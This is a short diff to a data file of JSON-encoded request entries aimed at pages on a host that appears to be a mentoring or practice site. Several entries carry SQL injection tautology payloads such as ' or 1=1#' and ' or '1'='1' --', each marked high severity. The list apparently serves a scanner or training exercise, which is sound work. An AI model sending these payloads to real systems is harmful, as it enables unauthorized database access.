@@ -15,3 +15,8 @@
 "{\n\t\"url\": \"mentoring.ton80.net/sql3.php\",\n\t\"fname\": \"i\",\n\t\"query\": \"\\\"or 1=1 or \\\"\\\"=\\\"\",\n\t\"war\": \"high\",\n\t\"method\": \"GET\"\n}"
 "{\n\t\"url\": \"mentoring.ton80.net/sql3.php\",\n\t\"fname\": \"i\",\n\t\"query\": \"\\\" or 1=1#\",\n\t\"war\": \"high\",\n\t\"method\": \"GET\"\n}"
 "{\n\t\"url\": \"mentoring.ton80.net/sql3.php\",\n\t\"fname\": \"i\",\n\t\"query\": \"\\\" or 1=1#\",\n\t\"war\": \"high\",\n\t\"method\": \"GET\"\n}"
+"{\n\t\"url\": \"mentoring.ton80.net/sql1.php\",\n\t\"fname\": \"i\",\n\t\"query\": \" or '1'='1' --\",\n\t\"war\": \"high\",\n\t\"method\": \"GET\"\n}"
+"{\n\t\"url\": \"mentoring.ton80.net/sql1.php\",\n\t\"fname\": \"i\",\n\t\"query\": \" or '1'='1'#\",\n\t\"war\": \"high\",\n\t\"method\": \"GET\"\n}"
+"{\n\t\"url\": \"mentoring.ton80.net/sql1.php\",\n\t\"fname\": \"i\",\n\t\"query\": \" or 1=1#\",\n\t\"war\": \"high\",\n\t\"method\": \"GET\"\n}"
+"{\n\t\"url\": \"mentoring.ton80.net/sql1.php\",\n\t\"fname\": \"i\",\n\t\"query\": \" or 1=1 --\",\n\t\"war\": \"high\",\n\t\"method\": \"GET\"\n}"
+"{\n\t\"url\": \"mentoring.ton80.net/sql1.php\",\n\t\"fname\": \"i\",\n\t\"query\": \" or 1=1#\",\n\t\"war\": \"high\",\n\t\"method\": \"GET\"\n}"
